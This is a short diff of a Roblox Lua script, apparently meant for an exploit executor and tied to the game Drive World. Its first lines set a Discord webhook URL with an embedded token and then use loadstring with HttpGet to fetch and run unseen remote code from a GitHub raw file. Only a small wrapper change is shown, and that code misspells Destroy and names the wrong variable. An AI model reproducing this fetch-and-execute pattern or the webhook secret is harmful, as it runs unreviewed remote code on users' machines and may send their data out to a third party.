@@ -1,7 +1,8 @@
 getgenv().Webhook = "https://discord.com/api/webhooks/1217498672086909058/eJ8l3L1KNlX89s0GmQqdBkruuHUGJqwpZF8_DA4E-cJiRY6UaLnpETVdwIaOmQJ7hqb2"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Pukhet/HALOO/main/DriveWorld_Sell.txt", true))()
 wait(.1)
-local Box = game.CoreGui:FindFirstChild("Box") if Box then 
+do 
+    local Box = game.CoreGui:FindFirstChild("Box") if Box then 
         Box1:Destory()
         end
     end
